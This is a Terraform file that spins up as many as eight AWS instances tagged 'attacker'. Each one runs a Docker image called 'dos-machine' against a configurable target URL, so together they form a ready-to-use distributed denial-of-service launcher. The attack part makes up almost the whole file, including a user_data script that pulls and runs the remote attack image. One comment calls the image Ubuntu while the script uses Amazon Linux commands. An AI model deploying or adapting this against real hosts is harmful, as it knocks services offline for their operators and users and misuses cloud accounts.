
variable "number_of_nodes" {
  description = "Number of AWS instances to spawn (max 8)"
  type        = number
  default     = 2
}

variable "duration" {
  description = "Duration of the attack in seconds (default 120, max 300)"
  type        = number
  default     = 120
  validation {
    condition     = var.duration <= 300
    error_message = "Duration must be 300 seconds or less."
  }
}

variable "threads_count" {
  description = "Number of threads to use in the attack"
  type        = number
  default     = 10
}

variable "target" {
  description = "Target URL for the attack"
  type        = string
  default     = "http://127.0.0.1:8888"
}

resource "aws_instance" "attacker" {
  count         = min(var.number_of_nodes, 8) # Limit to a maximum of 8 instances
  ami           = "ami-002f6e91abff6eb96"     # Ubuntu AMI (Consider making this a variable)
  instance_type = "t3.micro"
  monitoring    = true    

  user_data = <<-EOF
             #!/bin/bash
              sudo yum update -y && sudo yum install docker -y  # Corrected for Amazon Linux 2
              sudo service docker start
              sudo usermod -aG docker $USER
              sudo docker run --rm hardcorebihari/dos-machine ${var.target} ${var.threads_count} 0.5 2.0
              sudo shutdown -h now
              EOF

  tags = {
    Name = "attacker-${count.index}"
  }
}

output "instance_ids" {
  description = "IDs of the spawned AWS instances"
  value       = aws_instance.attacker[*].id
}

output "public_ips" {
  description = "Public IPs of the spawned AWS instances"
  value       = aws_instance.attacker[*].public_ip
}